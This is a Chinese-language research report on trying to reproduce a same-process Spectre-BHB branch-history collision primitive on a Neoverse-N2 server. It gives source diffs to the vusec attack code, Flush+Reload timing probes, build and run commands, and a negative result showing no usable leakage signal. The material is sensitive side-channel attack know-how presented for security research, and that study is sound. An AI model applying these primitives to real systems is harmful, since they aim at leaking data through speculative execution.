# L1-1 源码与改动梳理报告

> 范围：梳理**源码来源 + 本次对话的源码修改 + 最终运行结果**。完整判定见《L1-1_结论卡》。运行环境：倚天 710 / Neoverse-N2，`8.137.179.142`，同进程 EL0，仅 L1D Flush+Reload。

## 1. 基线来源
- 仓库：`github.com/vusec/bhi-spectre-bhb`，tag `ae_final`，Apache-2.0。
- 选用子目录：`re/arm/bhb_brute_force`（同进程 EL0 的 BHB 碰撞原语）。
- **未选** `re/arm/bhi_test`：那是跨特权(用户→内核)版本，需定制内核(syscall 441/442)、physmap、关缓解——超出 L1-1 范围，排除。

## 2. 文件清单与职责
| 文件 | 职责 | 是否改动 |
|---|---|---|
| `re/arm/bhb_brute_force/src/snippet.S` | 三个 gadget：`ret_gadget`/`hit_gadget`/`ind_gadget` | **未改** |
| `re/arm/bhb_brute_force/src/main.c` | jit 分支链、训练/测试主循环、F+R 探测 | 改（见 §4.3–4.6） |

## 3. 未改动部分（攻击原语本体，100% 上游）
- **`snippet.S`** 全文未改：
  - `ind_gadget: ldr x0,[x0]; br x0` —— 受害者**间接分支**(v2/BHB 家族)。
  - `hit_gadget: ldr x1,[x1]` —— 泄露/到达探针（把 fr_buf 拉进 L1D）。
  - `ret_gadget: nop; ret` —— 安全目标。
- **`main.c` 的 `jit()`** 与**每轮 训练→flush→测试→load_time** 核心循环：未改。
- **`helper.h` 的 F+R 原语**（`clflush`/`fence`/`maccess`）：除计时 1 行外未改。
> 即：被测的推测路径是上游真身，我们没动它。

## 4. 改动明细（逐文件 before → after）

### 4.1 `common/helper.h` —— 计时源（1 行）
本机 `perf_user_access=0`，EL0 读 `PMCCNTR_EL0` 会 SIGILL；上游靠定制内核 syscall 442 开 PMU，本机无。改读 EL0 恒可读的 `cntvct_el0`（与 L1-1R 金标同源）。
```c
// rdtscp() 的 ARMV8 分支
- asm volatile("mrs %0, pmccntr_el0" : "=r" (result));
+ asm volatile("mrs %0, cntvct_el0" : "=r" (result));
```

### 4.2 `common/targets.h` —— 新增 N2 目标块
插在 `#else / #error "Must specify a target"` 之前：
```c
#elif defined YITIAN_710
#define ARCH            (ARMV8)
#define THR             (6)          // ≡ L1-1R 的 <=5；ruler 实测 cached≈2/flushed≈10.7
#define STRIDE          (4096)       // 单线探测；256 线恢复才需 4160
#define PHYS_OFFSET     (0x80000000LL)
#define PAGE_OFFSET     (0xffffff8000000000ULL)
```

### 4.3 `main.c` —— 去内核依赖
```c
- syscall(BHI_ENABLE_SYSCALL);
+ // removed: using cntvct_el0, no custom kernel
```

### 4.4 `main.c` —— 新增 ruler 自检（闸门一）
插在 `printf("rwx mem: %p\n", mem);` 之后。上游无此自检，补上以判"尺子好坏"：
```c
    // --- gate-1 ruler: cached vs flushed on fr_buf (cntvct) ---
    {
        uint64_t mh = 0, mm = 0;
        for (int i = 0; i < 1000; i++) { maccess(fr_buf); mh += load_time(fr_buf); }
        for (int i = 0; i < 1000; i++) { clflush(fr_buf); fence(); mm += load_time(fr_buf); }
        printf("[ruler] cached=%.2f flushed=%.2f THR=%d %s\n",
               (double)mh/1000, (double)mm/1000, THR,
               (mm > mh + 2) ? "OK" : "WARN:no-sep");
    }
```

### 4.5 `main.c` —— 替换"打印 hits"为 CTRL/MAIN/POS 受控复跑
上游原本只 `if(hits>ITER/2) printf("hits: %d\n", hits);`。替换为：搜到碰撞即原地复跑 2000×，三模式 + 落 `raw.csv`，然后 `break` 退出：
```c
        if(hits > ITER/2)
        {
            printf("\n[FOUND] round=%d first=%d/%d - replaying\n", round, hits, ITER);
            FILE *f=fopen("raw.csv","w"); fprintf(f,"mode,iter,dt,hit\n");
            int M=2000, cmain=0, cctrl=0; uint64_t dt; int h;
            for(int k=0;k<M;k++){            // CTRL: 误训练到安全目标 ftable[0]
                hit_ptr(&ftable[0], fr_buf);
                clflush(&ftable[0]); clflush(&ftable[1]); clflush(fr_buf);
                ret_ptr(&ftable[0], fr_buf);
                dt=load_time(fr_buf); h=dt<THR; cctrl+=h;
                fprintf(f,"CTRL,%d,%lu,%d\n",k,dt,h);
            }
            for(int k=0;k<M;k++){            // MAIN: 训练到 hit_gadget ftable[1]
                hit_ptr(&ftable[1], fr_buf);
                clflush(&ftable[0]); clflush(&ftable[1]); clflush(fr_buf);
                ret_ptr(&ftable[0], fr_buf);
                dt=load_time(fr_buf); h=dt<THR; cmain+=h;
                fprintf(f,"MAIN,%d,%lu,%d\n",k,dt,h);
            }
            int cpos=0;
            for(int k=0;k<M;k++){            // POS: 强制间接分支真跳 hit_gadget（不 flush fr_buf）
                hit_ptr(&ftable[1], fr_buf);
                clflush(&ftable[0]); clflush(&ftable[1]);
                ret_ptr(&ftable[1], fr_buf);
                dt=load_time(fr_buf); h=dt<THR; cpos+=h;
                fprintf(f,"POS,%d,%lu,%d\n",k,dt,h);
            }
            fclose(f);
            printf("[MAIN] trained  = %d/%d (%.1f%%)\n", cmain,M,100.0*cmain/M);
            printf("[CTRL] mistrain = %d/%d (%.1f%%)\n", cctrl,M,100.0*cctrl/M);
            printf("[POS]  forced   = %d/%d (%.1f%%)\n", cpos,M,100.0*cpos/M);
            printf("wrote raw.csv (%d rows)\n", 2*M);   // 注：实际 6000 行(三模式)，此处为显示笔误
            break;
        }
```

### 4.6 `main.c` —— `IN_PLACE` 开关
`#define IN_PLACE 1`（同地址，纯历史效应）跑出主结果后，切 `0`（异地址别名）复核：
```c
- #define IN_PLACE            1
+ #define IN_PLACE            0
```
**当前源码树停在 `IN_PLACE=0`**；主结果表（POS=100%/MAIN=0.1%）是 `IN_PLACE=1` 下取得。

### 4.7 构建调用变更（Makefile 文件未改）
上游 arm Makefile 用 `$(CC_ANDROID)`（交叉编译器）和 `-D$(TARGET)`（非 `UARCH`）。本机原生 aarch64，改用原生 gcc：
```
原: make UARCH=PIXEL_6          # 对 arm 无效，CC_ANDROID/TARGET 均空 → #error
改: make CC_ANDROID=gcc TARGET=YITIAN_710
```

## 5. 最终运行结果

### 5.1 闸门一（ruler）—— F+R 尺子有效
```
[ruler] cached=2.09 flushed=10.72 THR=6 OK
```
命中 ~2 tick（L1D 命中）、未命中 ~10.7 tick，THR=6 卡在正中，分离干净。

### 5.2 主跑（IN_PLACE=1，对应已存档的 raw.csv）
```
[FOUND] round=198022 first=51/100 - replaying
[MAIN] trained  =    2/2000 (0.1%)    ← 瞬态转向 ≈ 0
[CTRL] mistrain =    0/2000 (0.0%)    ← 噪声底
[POS]  forced   = 2000/2000 (100.0%)  ← 测量链路有效
```
**POS=100% 排除"测量坏了"；MAIN≈CTRL 说明瞬态 BHB 转向没发生。** brute_force 报出的"碰撞"永远是刚过 50（51/52/61），干净复跑全塌——从未找到真碰撞（真碰撞应 >90%，参照论文 Cortex-X1）。

### 5.3 dt 分布（代表性复跑，证无分离）
MAIN 与 CTRL 几乎重合，均堆在 dt=8–9；`<6`(真命中) 两者≈0；POS 则全部 `<THR`。

| dt | MAIN | CTRL |
|---|---|---|
| 8 | 1195 | 1271 |
| 9 | 484 | 457 |
| 10–15 | ~320 | ~270 |
| **<6（命中）** | **~1** | **0** |

抬 THR 也无济：dt≤9 时 CTRL(1728) 反多于 MAIN(1680)，signal 不存在。

### 5.4 IN_PLACE=0 变体
180s 内**无任何碰撞 surface**（连噪声级穿越都没有），与 IN_PLACE=1 的负结论一致。

### 5.5 判定
**`fail` / `failure_mode=E004`（信号不可区分）。** N2 默认配置下，同进程 in-place BHB 瞬态转向无可用信号，且已由 POS=100% 排除测量问题。**非免疫结论**——跨特权 CVE-2022-23960 仍在，由固件 CSV2(0b0010)+BHB 清除在异常边界缓解；本实验仅覆盖同进程 in-place 原语。

## 6. 复现（从干净 clone 到可跑）
```bash
git clone https://github.com/vusec/bhi-spectre-bhb.git && cd bhi-spectre-bhb && git checkout ae_final
# 应用 §4.1–4.6 改动
cd re/arm/bhb_brute_force
make clean && make CC_ANDROID=gcc TARGET=YITIAN_710
taskset -c 2 ./main.o          # 搜到碰撞即复跑并打印 ruler / MAIN / CTRL / POS
```
